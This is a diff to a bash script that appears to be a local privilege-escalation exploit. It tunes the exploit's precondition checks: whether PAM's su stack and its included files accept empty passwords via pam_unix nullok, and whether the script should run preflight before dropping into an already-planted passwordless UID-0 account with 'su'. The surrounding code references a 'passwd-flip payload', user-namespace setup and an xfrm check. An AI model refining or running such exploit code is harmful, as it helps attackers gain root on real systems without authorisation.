@@ -63,12 +63,25 @@ check_xfrm() {
 # The passwd-flip payload only completes if PAM accepts an empty password
 # (pam_unix.so nullok). NixOS doesn't ship that by default.
 check_pam_nullok() {
-    # Strip comments (#-prefixed lines) before checking, otherwise commented-out
-    # nullok references give a false positive.
-    {
-        cat /etc/pam.d/* /etc/pam.conf 2>/dev/null
-        cat /etc/pam.d/*/* 2>/dev/null
-    } | grep -vE '^[[:space:]]*#' \
+    # The su(1) PAM stack is what gates our payload — checking other services
+    # (login, sshd, sudo) gives false positives. Walk /etc/pam.d/su plus any
+    # files it pulls in via include/substack.
+    local f=/etc/pam.d/su inc target
+    [ -r "$f" ] || return 1
+    local -a files=("$f")
+    # Follow one level of include/substack/@include.
+    while IFS= read -r inc; do
+        target=""
+        if   [[ "$inc" =~ ^[[:space:]]*@include[[:space:]]+([^[:space:]]+) ]]; then
+            target="/etc/pam.d/${BASH_REMATCH[1]}"
+        elif [[ "$inc" =~ ^[[:space:]]*[a-z]+[[:space:]]+(include|substack)[[:space:]]+([^[:space:]]+) ]]; then
+            target="/etc/pam.d/${BASH_REMATCH[2]}"
+        fi
+        [ -n "$target" ] && [ -r "$target" ] && files+=("$target")
+    done < <(grep -vE '^[[:space:]]*#' "$f" 2>/dev/null)
+    cat "${files[@]}" 2>/dev/null \
+      | grep -vE '^[[:space:]]*#' \
+      | grep -E '^[[:space:]]*auth\b' \
       | grep -qE 'pam_unix\.so[[:space:]][^#]*\bnullok\b'
 }
 
@@ -205,12 +218,12 @@ if [ "${1:-}" = "--help" ] || [ "${1:-}" = "-h" ]; then
 fi
 
 # Already installed? Just su.
+preflight || exit 1
+
 if getent passwd "$NEW_USER" | grep -q "^${NEW_USER}::0:0:"; then
     green "[+] '$NEW_USER' already in /etc/passwd"
     exec su - "$NEW_USER"
 fi
-
-preflight || exit 1
 
 setup_usns
 build_helper
